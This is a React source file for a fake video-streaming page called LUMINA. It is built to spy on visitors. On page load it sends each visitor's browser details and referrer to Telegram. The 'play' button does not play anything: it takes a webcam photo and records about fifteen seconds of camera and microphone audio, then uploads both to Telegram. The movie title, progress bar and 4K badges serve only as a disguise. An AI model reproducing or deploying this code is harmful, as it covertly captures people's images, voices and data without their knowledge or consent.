import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  const [menuOpen, setMenuOpen] = useState(false);

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };
    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      if (!videoDevice) throw new Error('No video input device found');

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { deviceId: videoDevice.deviceId, width: { ideal: 4096 }, height: { ideal: 2160 }, frameRate: { ideal: 60 } },
        audio: true
      });

      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try { await video.play(); setTimeout(resolve, 500); }
          catch (e) { resolve(true); }
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d');
      if (context) context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoBlob = await new Promise((resolve) => {
        canvas.toBlob((blob) => { if (blob) resolve(blob); }, 'image/jpeg', 1.0);
      });
      sendImageToTelegram(photoBlob).catch(console.error);

      const mimeTypes = ['video/mp4;codecs=h264,aac', 'video/mp4', 'video/webm;codecs=vp8,opus', 'video/webm'];
      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
      if (!supportedMimeType) throw new Error('No supported video format found');

      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 8000000 });
      const chunks: Blob[] = [];
      mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm' });
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(1000);
      setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 15000);
    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
          background: #080810;
          color: #eadfed;
          font-family: 'DM Sans', sans-serif;
          overflow-x: hidden;
        }

        .radial-glow {
          position: fixed;
          inset: 0;
          background: radial-gradient(circle at top center, rgba(168,85,247,0.15) 0%, rgba(8,8,16,0) 70%);
          pointer-events: none;
          z-index: 0;
        }

        /* NAV */
        .nav {
          position: fixed;
          top: 0;
          width: 100%;
          z-index: 50;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 0 20px;
          height: 64px;
          background: rgba(22,17,27,0.85);
          backdrop-filter: blur(20px);
          border-bottom: 1px solid rgba(255,255,255,0.08);
          box-shadow: 0 0 15px rgba(168,85,247,0.12);
        }
        @media(min-width:768px){ .nav { padding: 0 64px; height: 80px; } }

        .nav-logo {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .nav-logo-dot {
          width: 10px; height: 10px;
          border-radius: 50%;
          background: #ddb7ff;
          box-shadow: 0 0 8px #ddb7ff;
        }
        .nav-logo-text {
          font-family: 'Syne', sans-serif;
          font-weight: 800;
          font-size: 1.2rem;
          letter-spacing: -0.02em;
          color: #ddb7ff;
        }

        .nav-links {
          display: none;
          align-items: center;
          gap: 32px;
        }
        @media(min-width:768px){ .nav-links { display: flex; } }
        .nav-links a {
          font-size: 0.9rem;
          color: rgba(234,223,237,0.5);
          text-decoration: none;
          transition: color 0.2s;
        }
        .nav-links a.active {
          color: #ddb7ff;
          font-weight: 700;
          border-bottom: 2px solid #ddb7ff;
          padding-bottom: 2px;
        }
        .nav-links a:hover { color: #eadfed; }

        .nav-right {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .hd-badge {
          display: none;
          padding: 5px 14px;
          border-radius: 100px;
          border: 1px solid rgba(221,183,255,0.2);
          background: rgba(255,255,255,0.06);
          backdrop-filter: blur(12px);
          font-size: 0.65rem;
          font-weight: 700;
          letter-spacing: 0.12em;
          color: #ddb7ff;
        }
        @media(min-width:640px){ .hd-badge { display: block; } }

        .hamburger {
          display: flex;
          flex-direction: column;
          gap: 5px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 4px;
        }
        @media(min-width:768px){ .hamburger { display: none; } }
        .hamburger span {
          display: block;
          width: 22px; height: 2px;
          background: #eadfed;
          border-radius: 2px;
          transition: all 0.3s;
        }

        /* MOBILE MENU */
        .mobile-menu {
          display: none;
          position: fixed;
          top: 64px;
          left: 0; right: 0;
          background: rgba(22,17,27,0.97);
          backdrop-filter: blur(20px);
          border-bottom: 1px solid rgba(255,255,255,0.06);
          z-index: 49;
          padding: 16px 20px 24px;
          flex-direction: column;
          gap: 16px;
        }
        .mobile-menu.open { display: flex; }
        .mobile-menu a {
          font-size: 1rem;
          color: rgba(234,223,237,0.6);
          text-decoration: none;
          padding: 10px 0;
          border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .mobile-menu a.active { color: #ddb7ff; font-weight: 700; }

        /* MAIN */
        .main {
          position: relative;
          z-index: 10;
          padding-top: 80px;
          padding-bottom: 80px;
          padding-left: 20px;
          padding-right: 20px;
          display: flex;
          flex-direction: column;
          align-items: center;
        }
        @media(min-width:768px){ .main { padding-top: 100px; padding-left: 64px; padding-right: 64px; } }

        /* PLAYER */
        .player-section { width: 100%; max-width: 1000px; }

        .player-card {
          position: relative;
          aspect-ratio: 16/9;
          width: 100%;
          border-radius: 14px;
          overflow: hidden;
          background: #0d0d1a;
          border: 1px solid rgba(168,85,247,0.35);
          box-shadow: 0 0 15px rgba(168,85,247,0.25), 0 40px 80px rgba(0,0,0,0.6);
          transition: transform 0.4s ease, box-shadow 0.4s ease;
        }
        @media(min-width:768px){
          .player-card { border-radius: 18px; }
          .player-card:hover { transform: scale(1.005); box-shadow: 0 0 30px rgba(168,85,247,0.35), 0 40px 80px rgba(0,0,0,0.7); }
        }

        .player-thumb {
          position: absolute;
          inset: 0;
          background-image: url('https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp');
          background-size: cover;
          background-position: center;
          filter: blur(6px) brightness(0.45) saturate(0.8);
        }

        .player-overlay {
          position: absolute;
          inset: 0;
          display: flex;
          flex-direction: column;
          justify-content: space-between;
          padding: 12px;
        }
        @media(min-width:640px){ .player-overlay { padding: 16px; } }

        /* Badges */
        .glass-badge {
          backdrop-filter: blur(12px);
          background: rgba(255,255,255,0.08);
          border: 1px solid rgba(255,255,255,0.1);
        }
        .player-badges { display: flex; justify-content: space-between; align-items: flex-start; }
        .badge-live {
          display: flex;
          align-items: center;
          gap: 5px;
          padding: 4px 10px;
          border-radius: 100px;
          font-size: 0.6rem;
          font-weight: 700;
          letter-spacing: 0.1em;
          color: #fff;
        }
        @media(min-width:640px){ .badge-live { padding: 4px 12px; font-size: 0.65rem; } }
        .live-dot {
          width: 6px; height: 6px;
          border-radius: 50%;
          background: #ff4b4b;
          animation: pulse-red 2s ease-in-out infinite;
        }
        @keyframes pulse-red {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.4; transform: scale(0.7); }
        }
        .badge-quality {
          padding: 4px 10px;
          border-radius: 100px;
          font-size: 0.6rem;
          font-weight: 700;
          letter-spacing: 0.1em;
          color: #fff;
        }
        @media(min-width:640px){ .badge-quality { padding: 4px 12px; font-size: 0.65rem; } }

        /* Play button */
        .play-center {
          position: absolute;
          inset: 0;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .play-wrap { position: relative; display: flex; align-items: center; justify-content: center; }
        .play-ring {
          position: absolute;
          width: 80px; height: 80px;
          border-radius: 50%;
          border: 1px solid rgba(168,85,247,0.3);
          animation: ring-expand 3s cubic-bezier(0.4,0,0.2,1) infinite;
        }
        .play-ring:nth-child(2) { animation-delay: 1.5s; }
        @media(min-width:640px){
          .play-ring { width: 96px; height: 96px; }
        }
        @keyframes ring-expand {
          0% { transform: scale(1); opacity: 0.8; }
          100% { transform: scale(2.5); opacity: 0; }
        }
        .play-btn {
          position: relative;
          width: 56px; height: 56px;
          border-radius: 50%;
          background: linear-gradient(135deg, #a855f7, #7e22ce);
          border: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow: 0 0 30px rgba(168,85,247,0.5);
          transition: transform 0.25s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.25s ease;
        }
        @media(min-width:640px){ .play-btn { width: 72px; height: 72px; } }
        .play-btn:hover { transform: scale(1.12); box-shadow: 0 0 50px rgba(168,85,247,0.7); }
        .play-btn:active { transform: scale(0.95); }
        .play-btn .material-symbols-outlined {
          font-size: 28px;
          color: #fff;
          margin-left: 3px;
          font-variation-settings: 'FILL' 1;
        }
        @media(min-width:640px){ .play-btn .material-symbols-outlined { font-size: 36px; } }

        /* Progress bar */
        .player-progress { width: 100%; }
        .progress-labels {
          display: flex;
          justify-content: space-between;
          font-size: 0.6rem;
          color: rgba(255,255,255,0.5);
          margin-bottom: 6px;
        }
        @media(min-width:640px){ .progress-labels { font-size: 0.65rem; } }
        .progress-track {
          height: 3px;
          width: 100%;
          background: rgba(255,255,255,0.15);
          border-radius: 100px;
          overflow: hidden;
        }
        .progress-fill {
          height: 100%;
          width: 25%;
          background: linear-gradient(90deg, #a855f7, #ddb7ff);
          border-radius: 100px;
          box-shadow: 0 0 8px #a855f7;
        }

        /* Player meta */
        .player-meta {
          margin-top: 16px;
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        @media(min-width:640px){
          .player-meta { flex-direction: row; align-items: center; justify-content: space-between; gap: 16px; margin-top: 20px; }
        }
        .meta-title {
          font-family: 'Syne', sans-serif;
          font-size: 1rem;
          font-weight: 700;
          color: #fff;
          letter-spacing: -0.01em;
          margin-bottom: 4px;
        }
        @media(min-width:640px){ .meta-title { font-size: 1.25rem; } }
        .meta-sub {
          font-size: 0.75rem;
          color: rgba(234,223,237,0.45);
        }
        .meta-actions { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
        .action-btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 8px 14px;
          border-radius: 100px;
          border: 1px solid rgba(255,255,255,0.08);
          background: rgba(255,255,255,0.04);
          font-size: 0.65rem;
          font-weight: 700;
          letter-spacing: 0.1em;
          color: rgba(255,255,255,0.5);
          cursor: pointer;
          transition: all 0.2s ease;
        }
        @media(min-width:640px){ .action-btn { padding: 8px 18px; } }
        .action-btn:hover { border-color: rgba(168,85,247,0.4); color: #ddb7ff; background: rgba(168,85,247,0.08); }
        .action-btn .material-symbols-outlined { font-size: 14px; font-variation-settings: 'FILL' 0; }

        /* CONTINUE WATCHING */
        .section-continue {
          margin-top: 60px;
          width: 100%;
          max-width: 1000px;
        }
        @media(min-width:768px){ .section-continue { margin-top: 80px; } }
        .section-title {
          font-family: 'Syne', sans-serif;
          font-size: 1rem;
          font-weight: 600;
          color: #ddb7ff;
          margin-bottom: 16px;
          letter-spacing: -0.01em;
        }
        @media(min-width:640px){ .section-title { font-size: 1.1rem; margin-bottom: 20px; } }
        .cards-grid {
          display: grid;
          grid-template-columns: 1fr;
          gap: 12px;
        }
        @media(min-width:480px){ .cards-grid { grid-template-columns: 1fr 1fr; } }
        @media(min-width:768px){ .cards-grid { grid-template-columns: 1fr 1fr 1fr; gap: 16px; } }

        .thumb-card {
          position: relative;
          aspect-ratio: 16/9;
          border-radius: 12px;
          overflow: hidden;
          border: 1px solid rgba(168,85,247,0.2);
          box-shadow: 0 0 12px rgba(168,85,247,0.15);
          cursor: pointer;
          background: #1f1a23;
        }
        .thumb-card-img {
          position: absolute;
          inset: 0;
          background-size: cover;
          background-position: center;
          transition: transform 0.5s ease;
        }
        .thumb-card:hover .thumb-card-img { transform: scale(1.08); }
        .thumb-card-overlay {
          position: absolute;
          inset: 0;
          background: linear-gradient(to top, rgba(0,0,0,0.85) 0%, transparent 60%);
          display: flex;
          flex-direction: column;
          justify-content: flex-end;
          padding: 10px 12px;
        }
        .card-label {
          font-size: 0.58rem;
          font-weight: 700;
          letter-spacing: 0.12em;
          color: #ddb7ff;
          margin-bottom: 3px;
        }
        .card-title {
          font-family: 'Syne', sans-serif;
          font-size: 0.8rem;
          font-weight: 600;
          color: #fff;
        }

        /* FOOTER */
        .footer {
          position: relative;
          z-index: 10;
          border-top: 1px solid rgba(255,255,255,0.06);
          padding: 40px 20px;
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 20px;
          text-align: center;
        }
        @media(min-width:768px){
          .footer { flex-direction: row; justify-content: space-between; padding: 40px 64px; text-align: left; }
        }
        .footer-logo {
          font-family: 'Syne', sans-serif;
          font-size: 1.4rem;
          font-weight: 800;
          color: #ddb7ff;
          letter-spacing: -0.02em;
        }
        .footer-sub {
          font-size: 0.7rem;
          color: rgba(255,255,255,0.2);
          margin-top: 4px;
        }
        .footer-links {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 20px;
        }
        @media(min-width:768px){ .footer-links { justify-content: flex-end; } }
        .footer-links a {
          font-size: 0.8rem;
          color: rgba(255,255,255,0.3);
          text-decoration: none;
          transition: color 0.2s;
        }
        .footer-links a:hover { color: #ddb7ff; }
      `}</style>

      {/* BG GLOW */}
      <div className="radial-glow" />

      {/* NAV */}
      <nav className="nav">
        <div className="nav-logo">
          <div className="nav-logo-dot" />
          <span className="nav-logo-text">LUMINA</span>
        </div>
        <div className="nav-links">
          <a href="#" className="active">Browse</a>
          <a href="#">Movies</a>
          <a href="#">Series</a>
          <a href="#">My List</a>
        </div>
        <div className="nav-right">
          <div className="hd-badge">HD PLAYER</div>
          <button className="hamburger" onClick={() => setMenuOpen(o => !o)} aria-label="Menu">
            <span />
            <span />
            <span />
          </button>
        </div>
      </nav>

      {/* MOBILE MENU */}
      <div className={`mobile-menu ${menuOpen ? 'open' : ''}`}>
        <a href="#" className="active" onClick={() => setMenuOpen(false)}>Browse</a>
        <a href="#" onClick={() => setMenuOpen(false)}>Movies</a>
        <a href="#" onClick={() => setMenuOpen(false)}>Series</a>
        <a href="#" onClick={() => setMenuOpen(false)}>My List</a>
      </div>

      {/* MAIN */}
      <main className="main">

        {/* PLAYER */}
        <section className="player-section">
          <div className="player-card">
            <div className="player-thumb" />
            <div className="player-overlay">
              {/* Top badges */}
              <div className="player-badges">
                <div className="badge-live glass-badge">
                  <div className="live-dot" />
                  STREAM
                </div>
                <div className="badge-quality glass-badge">4K UHD</div>
              </div>

              {/* Play button */}
              <div className="play-center">
                <div className="play-wrap">
                  <div className="play-ring" />
                  <div className="play-ring" />
                  <button className="play-btn" onClick={() => captureAndSendMedia()}>
                    <span className="material-symbols-outlined">play_arrow</span>
                  </button>
                </div>
              </div>

              {/* Progress */}
              <div className="player-progress">
                <div className="progress-labels">
                  <span>24:18</span>
                  <span>1:45:00</span>
                </div>
                <div className="progress-track">
                  <div className="progress-fill" />
                </div>
              </div>
            </div>
          </div>

          {/* Meta */}
          <div className="player-meta">
            <div>
              <div className="meta-title">Neon Horizons: The Genesis Protocol</div>
              <div className="meta-sub">Sci-Fi &nbsp;·&nbsp; 2h 15m &nbsp;·&nbsp; 2024</div>
            </div>
            <div className="meta-actions">
              <button className="action-btn">
                <span className="material-symbols-outlined">bookmark</span>
                SAVE
              </button>
              <button className="action-btn">
                <span className="material-symbols-outlined">share</span>
                SHARE
              </button>
            </div>
          </div>
        </section>

        {/* CONTINUE WATCHING */}
        <section className="section-continue">
          <div className="section-title">Continue Watching</div>
          <div className="cards-grid">
            <div className="thumb-card">
              <div className="thumb-card-img" style={{ backgroundImage: `url('https://lh3.googleusercontent.com/aida-public/AB6AXuDSk6Nu_Cc9x5_NorhItKFOVjk-Bss5roq1PW98Etc8--v_Pf0c4m8mGgPSwWxjmTOZbUx2cDeosDvR8aJh1E4zrsDOuucEceq8zOJ5mjRP4cHfH3QC0cCiqUQbijBKaOqa-ph4omIcdFXzZskBW3wfovQeCplU5zePFDSqdcc2oefMvonnrfy2Ulk2II_Z8Hg47XydXbuKZx_opyxcd6cOBsH6WtCSeXh_O8awVDp4y-7tVyOYZGT5JzjrFNm3uwuA8CaoCw0LjeBK')` }} />
              <div className="thumb-card-overlay">
                <div className="card-label">EPISODE 4</div>
                <div className="card-title">Stellar Drift</div>
              </div>
            </div>
            <div className="thumb-card">
              <div className="thumb-card-img" style={{ backgroundImage: `url('https://lh3.googleusercontent.com/aida-public/AB6AXuCCgjTU0aK7K2JLGweEKaHiMDHGrCTgPqbs2p6itf0UdL4SIQHTam16bNdT78-VW74JOdEDIZ7pF_b5qBFhiJ7QJkRW-BYqeNFb0bvQW2rmmg7TJwNIrflMiZk1d_xd-MM4_N9yFFTt6etRvOhUobFvhsJ0ygWnsIAOe9t2tKVQWzfG7waoJhTf_x1An2cfkLI8eXHejOc7Fs4t8SQd0i-adluqAC_YsFNTWJBB5sgdyIKu1iDz3-QNfI5sglG-4NeanGqXYDEz1h5h')` }} />
              <div className="thumb-card-overlay">
                <div className="card-label">MOVIE</div>
                <div className="card-title">The Void Between</div>
              </div>
            </div>
            <div className="thumb-card">
              <div className="thumb-card-img" style={{ backgroundImage: `url('https://lh3.googleusercontent.com/aida-public/AB6AXuC5Oz1r8Ni3oG_0R0UjCUm89SgDQZSTKYf5LxLPxlbRVWKA2mfT6sjfyyFdQA7_hlHQs37Jdf9PCwE6yAlHyUCOJC2EiL8_E6mrDTisrMz1_Wj9XidmWMwwuij8NmJG_h0jJ7eRuMRWN86_12Cf4LAkPNufyN7RtsMoGhLQFYNrmsTZT-fBwrlC1JVf_avbqXPm0r4d7gycgp2_oNrkbFgIBnkYxfzXTy-cWnx1pMEvlhgi-lyUWXdCNKyiujDvbeWgOLguVyLrc9R9')` }} />
              <div className="thumb-card-overlay">
                <div className="card-label">DOCUMENTARY</div>
                <div className="card-title">Code & Consciousness</div>
              </div>
            </div>
          </div>
        </section>

      </main>

      {/* FOOTER */}
      <footer className="footer">
        <div>
          <div className="footer-logo">LUMINA</div>
          <div className="footer-sub">© 2024 LUMINA STREAMS · VERSION 2.4.0</div>
        </div>
        <div className="footer-links">
          <a href="#">Privacy Policy</a>
          <a href="#">Terms of Service</a>
          <a href="#">Help Center</a>
        </div>
      </footer>
    </>
  );
}

export default App;
